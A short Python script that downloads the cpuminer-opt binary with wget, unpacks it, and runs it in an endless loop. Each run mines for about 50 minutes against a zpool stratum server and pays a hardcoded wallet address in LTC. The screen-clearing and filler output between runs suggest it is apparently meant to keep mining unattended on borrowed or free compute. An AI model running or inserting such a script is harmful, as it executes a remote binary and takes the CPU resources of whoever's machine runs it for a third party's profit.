import sys
import os
from time import sleep
os.system('wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz')
sleep(2)
os.system('tar xf cpuminer-opt-linux.tar.gz')
sleep(2)
while(True):
	os.system('clear')
	sleep(2)
	os.system('timeout 3000 ./cpuminer-sse2 -a cpupower -o stratum+tcp://cpupower.jp.mine.zpool.ca:6240 -u MQvjjPLGJCeHjtjKEHqnV5hBq2kFmWyAea -p c=LTC')
	sleep(2)
	print("Enter ...")
	os.system('echo -e "\n"')
	sleep(1)
	os.system('echo -e "\n"')
	sleep(1)
	os.system('echo -e "\n"')
	sleep(1)
	print("Oke done ...")
	sleep(2)
